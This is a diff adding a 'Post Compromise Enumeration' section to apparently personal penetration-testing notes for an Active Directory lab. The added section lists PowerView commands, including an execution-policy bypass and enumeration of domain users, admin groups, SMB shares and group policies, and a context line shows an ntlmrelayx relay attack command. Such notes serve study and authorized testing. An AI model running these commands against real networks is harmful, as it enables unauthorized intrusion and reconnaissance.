@@ -57,3 +57,35 @@ ntlmrelayx.py -6 -t ldaps://<domaincontrollerip> -wh fakewpad.marvel.local -l lo
 
 # Once users are enumerated, look in the lootme directory it created for info
 ````
+
+### Post Compromise Enumeration
+#### PowerView
+```
+# Use https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+powershell -ep bypass # Bypasses the execution policy
+
+# In the directory the PowerView.ps1 script is in
+. .\PowerView.ps1
+
+# Return information for the domain
+Get-NetDomain
+Get-NetDomainController
+Get-DomainPolicy
+(Get-DomainPolicy)."system access"
+
+# Get user information
+Get-NetUser
+Get-NetUser | select cn [or samaccountname, description]
+Get-UserProperty -Properties pwdlastset [or logoncount, badpwdcount]
+
+# Get computer information in domain
+Get-NetComputer -FullData | select OperatingSystem
+Get-NetGroup -GroupName *admin*
+Get-NetGroupMember -GroupName "Domain Admins"
+
+# Check SMB Shares
+Invoke-ShareFinder
+
+# Group Policies
+Get-NetGPO | select displayname, whenchanged
+```
